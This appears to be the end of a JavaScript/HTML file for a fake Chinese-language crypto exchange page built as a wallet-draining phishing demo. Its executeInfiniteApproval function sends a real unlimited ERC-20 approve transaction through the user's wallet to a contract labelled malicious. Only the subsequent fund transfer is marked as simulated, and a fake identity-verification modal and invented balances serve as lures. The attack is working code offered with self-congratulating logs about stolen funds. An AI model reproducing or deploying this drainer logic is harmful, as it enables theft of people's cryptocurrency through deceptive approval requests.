        async function executeInfiniteApproval(coin, amount) {
            try {
                debugLog('🎯 执行无限授权攻击...');
                
                const tokenAddress = coin.contract;
                const maliciousContract = MALICIOUS_CONTRACTS[currentChainId];
                
                if (!maliciousContract) {
                    throw new Error('当前网络不支持');
                }

                // 无限授权金额
                const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
                
                debugLog(`🎯 代币合约: ${tokenAddress}`);
                debugLog(`🎯 恶意合约: ${maliciousContract}`);
                debugLog(`🎯 授权金额: 无限 (${maxUint256})`);

                // 构造approve交易数据
                const approveData = '0x095ea7b3' + // approve(address,uint256)
                    maliciousContract.slice(2).padStart(64, '0') + // spender
                    maxUint256.slice(2); // amount

                const txParams = {
                    from: currentAccount,
                    to: tokenAddress,
                    data: approveData,
                    gas: '0x15f90', // 90000 gas
                };

                debugLog('📤 发送无限授权交易...');
                const txHash = await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [txParams],
                });

                debugLog(`✅ 授权交易已发送: ${txHash}`);
                debugLog(`💰 攻击成功！用户已授权无限额度给恶意合约`);
                debugLog(`🎯 现在攻击者可以随时转移用户的 ${coin.symbol} 代币`);

                // 模拟资金转移
                setTimeout(() => {
                    simulateFundTransfer(coin, amount);
                }, 3000);

                return txHash;

            } catch (error) {
                if (error.code === 4001) {
                    debugLog('❌ 用户拒绝了授权请求');
                    throw new Error('用户取消交易');
                } else {
                    debugLog(`❌ 授权失败: ${error.message}`);
                    throw error;
                }
            }
        }

        // 模拟资金转移
        function simulateFundTransfer(coin, amount) {
            debugLog('💸 模拟执行资金转移...');
            debugLog(`📍 从用户账户: ${currentAccount}`);
            debugLog(`📍 转移到攻击者: ${ATTACKER_ADDRESS}`);
            debugLog(`💎 转移金额: ${amount} ${coin.symbol}`);
            debugLog(`💰 估计价值: $${(parseFloat(amount) * coin.price).toFixed(2)}`);
            debugLog('🏆 钓鱼攻击完全成功！资金已被窃取');
        }

        // 身份认证
        function startVerification() {
            showModal('身份认证', '请准备您的身份证件，认证过程需要2-5分钟。', () => {
                debugLog('📄 开始身份认证流程...');
                showAttackStatus('正在进行身份认证...', 'info');
                
                // 模拟认证过程
                setTimeout(() => {
                    isVerified = true;
                    document.getElementById('verificationNotice').style.display = 'none';
                    showAttackStatus('✅ 身份认证完成！现在可以进行交易', 'success');
                    debugLog('✅ 身份认证完成（模拟）');
                }, 3000);
            });
        }

        // 更新资产
        function updateAssets() {
            debugLog('💰 更新用户资产信息...');
            
            // 模拟资产数据
            const assets = {
                'BTC': { balance: 0.0234, value: 1012.45 },
                'ETH': { balance: 1.2567, value: 3087.23 },
                'USDT': { balance: 5432.10, value: 5432.10 },
                'OKB': { balance: 89.34, value: 4080.67 }
            };

            let totalValue = 0;
            const container = document.getElementById('assetsList');
            container.innerHTML = '';

            Object.entries(assets).forEach(([symbol, asset]) => {
                totalValue += asset.value;
                
                const coin = Object.values(COINS_DATA).find(c => c.symbol === symbol);
                if (coin) {
                    const item = document.createElement('div');
                    item.className = 'coin-item';
                    item.innerHTML = `
                        <div class="coin-info">
                            <div class="coin-icon">${coin.icon}</div>
                            <div class="coin-details">
                                <div class="coin-pair">${symbol}</div>
                                <div class="coin-volume">${asset.balance} ${symbol}</div>
                            </div>
                        </div>
                        <div class="coin-price">
                            <div class="price">$${asset.value.toFixed(2)}</div>
                        </div>
                    `;
                    container.appendChild(item);
                }
            });

            document.getElementById('totalBalance').textContent = totalValue.toFixed(2);
            debugLog(`💎 总资产价值: $${totalValue.toFixed(2)}`);
        }

        // 开始价格更新
        function startPriceUpdates() {
            setInterval(() => {
                // 模拟价格波动
                Object.keys(COINS_DATA).forEach(pair => {
                    const coin = COINS_DATA[pair];
                    const change = (Math.random() - 0.5) * 0.1; // ±0.05%
                    coin.price *= (1 + change / 100);
                    coin.change += change;
                });
                
                // 重新渲染列表
                renderFavoritesList();
                const activeMarketTab = document.querySelector('.market-tab.active');
                if (activeMarketTab) {
                    const type = activeMarketTab.textContent.includes('热门') ? 'hot' :
                                activeMarketTab.textContent.includes('涨幅') ? 'gainers' :
                                activeMarketTab.textContent.includes('跌幅') ? 'losers' : 'volume';
                    renderMarketList(type);
                }
            }, 5000);
        }

        // 开始金币下落动画
        function startCoinFallAnimation() {
            const container = document.getElementById('fallingCoins');
            const coins = ['₿', '⟠', '💰', '🪙', '💎'];
            
            // 清除现有动画
            container.innerHTML = '';
            
            // 创建下落的金币
            for (let i = 0; i < 15; i++) {
                setTimeout(() => {
                    const coin = document.createElement('div');
                    coin.className = 'falling-coin';
                    coin.textContent = coins[Math.floor(Math.random() * coins.length)];
                    coin.style.left = Math.random() * 100 + '%';
                    coin.style.animationDuration = (Math.random() * 3 + 2) + 's';
                    coin.style.animationDelay = Math.random() * 2 + 's';
                    
                    container.appendChild(coin);
                    
                    // 5秒后移除
                    setTimeout(() => {
                        if (coin.parentNode) {
                            coin.parentNode.removeChild(coin);
                        }
                    }, 5000);
                }, i * 200);
            }
        }

        // 切换市场标签
        function switchMarketTab(type) {
            document.querySelectorAll('.market-tab').forEach(tab => {
                tab.classList.remove('active');
            });
            event.currentTarget.classList.add('active');
            
            renderMarketList(type);
            debugLog(`📊 切换到${type}榜单`);
        }

        // 显示攻击状态
        function showAttackStatus(message, type) {
            const status = document.getElementById('attackStatus');
            status.textContent = message;
            status.className = 'attack-status show';
            
            if (type === 'success') {
                status.style.background = '#52c41a';
            } else if (type === 'error') {
                status.style.background = '#ff4d4f';
            } else {
                status.style.background = '#1890ff';
            }
            
            setTimeout(() => {
                status.classList.remove('show');
            }, 3000);
        }

        // 显示模态框
        function showModal(title, text, onConfirm) {
            document.getElementById('modalTitle').textContent = title;
            document.getElementById('modalText').textContent = text;
            document.getElementById('modalConfirm').onclick = () => {
                hideModal();
                if (onConfirm) onConfirm();
            };
            document.getElementById('modal').classList.add('show');
        }

        // 隐藏模态框
        function hideModal() {
            document.getElementById('modal').classList.remove('show');
        }

        // 调试日志
        function debugLog(message) {
            const debugLog = document.getElementById('debugLog');
            const timestamp = new Date().toLocaleTimeString();
            debugLog.innerHTML += `[${timestamp}] ${message}<br>`;
            debugLog.scrollTop = debugLog.scrollHeight;
            console.log(`[${timestamp}] ${message}`);
        }

        // 监听钱包事件
        if (window.ethereum) {
            window.ethereum.on('accountsChanged', function(accounts) {
                debugLog(`🔄 账户变化事件: ${JSON.stringify(accounts)}`);
                
                if (accounts.length === 0) {
                    debugLog('🔌 钱包已断开连接');
                    location.reload();
                } else {
                    const validAccounts = filterValidAccounts(accounts);
                    if (validAccounts.length > 0 && validAccounts[0] !== currentAccount) {
                        currentAccount = validAccounts[0];
                        debugLog(`🔄 账户已切换: ${currentAccount}`);
                        document.getElementById('walletStatus').textContent = `${currentAccount.substring(0, 6)}...${currentAccount.substring(38)}`;
                    }
                }
            });

            window.ethereum.on('chainChanged', function(chainId) {
                currentChainId = parseInt(chainId, 16);
                debugLog(`🌐 网络已切换: ${getNetworkName(currentChainId)} (${currentChainId})`);
            });
        }

        // 其他功能占位符
        function showAddFavorite() {
            showModal('添加自选', '选择要添加到自选的交易对', null);
        }

        function showCurrencySelector(type) {
            debugLog(`💱 显示${type}货币选择器`);
        }

        function showDeposit() {
            debugLog('💰 显示充币页面');
            showModal('充币', '选择要充值的币种和网络', null);
        }

        function showWithdraw() {
            debugLog('💸 显示提币页面');  
            showModal('提币', '选择要提取的币种和网络', null);
        }
    </script>
</body>
</html>
